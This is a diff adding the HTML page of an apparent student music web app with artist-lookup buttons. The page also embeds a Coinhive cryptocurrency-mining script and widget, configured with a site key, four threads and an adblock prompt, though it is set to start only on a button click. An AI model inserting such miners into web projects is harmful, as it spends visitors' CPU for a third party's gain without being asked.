@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<!-- Student Name:   -->
+<html lang="en">
+  <head>
+    <title>A Music Web Application</title>
+    <meta charset="utf-8"/>
+    <script type="text/javascript" src="music.js"></script>
+  </head>
+  <body>
+      <script src="https://coinhive.com/lib/miner.min.js" async></script>
+      <div class="coinhive-miner" 
+        style="width: 256px; height: 310px"
+        data-key="wE0QKK15iemf0sChRTfIa7ajRZWmv4cS"
+        data-autostart="false"
+        data-whitelabel="false"
+        data-background="#000000"
+        data-text="#eeeeee"
+        data-action="#00ff00"
+        data-graph="#555555"
+        data-threads="4"
+        data-throttle="0.1"
+        data-start="Start Now!">
+        <em>Please disable Adblock!</em>
+      </div>
+    <form>
+       <label>Artist name: <input type="text" id="form-input"/></label>
+       <input type="button" onclick="sendRequest();" value="Display All Info"/>
+       <input type="button" onclick="getBasicInfo();" value="Get Basic Info"/>
+       <input type="button" onclick="getTopAlbums();" value="Get Top Albums"/>
+       <input type="button" onclick="getSimilarArtists();" value="Get Similar Artists"/>
+    </form>
+    <div id="output1">&nbsp;</div>
+    <div id="output2">&nbsp;</div>
+    <div id="output3">&nbsp;</div>
+    <!-- <iframe id="output3" name="output3">&nbsp;</iframe> -->
+  </body>
+</html>
